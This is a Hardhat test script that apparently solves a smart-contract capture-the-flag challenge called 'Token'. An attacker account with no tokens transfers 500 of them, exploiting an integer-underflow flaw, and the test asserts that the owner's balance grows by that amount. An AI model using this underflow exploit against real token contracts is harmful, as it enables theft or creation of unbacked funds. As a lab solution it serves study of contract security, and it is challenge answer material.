const { ethers } = require("hardhat")
const { expect } = require("chai")

const CONTRACT_NAME = "Token"
const INITIAL_SUPPLY = 20
const FAKE_TRANSFER = 500

describe(CONTRACT_NAME, () => {
    let _owner
    let attacker
    let contract
    let tx

    beforeEach(async () => {
        ;[_owner, attacker] = await ethers.getSigners()
        const factory = await ethers.getContractFactory(CONTRACT_NAME)
        contract = await factory.deploy(INITIAL_SUPPLY)
        await contract.deployed()
    })

    it("Solves the challenge", async () => {
        await contract.connect(attacker).transfer(_owner.address, FAKE_TRANSFER)

        expect(await contract.balanceOf(_owner.address)).to.eq(INITIAL_SUPPLY + FAKE_TRANSFER)
    })
})
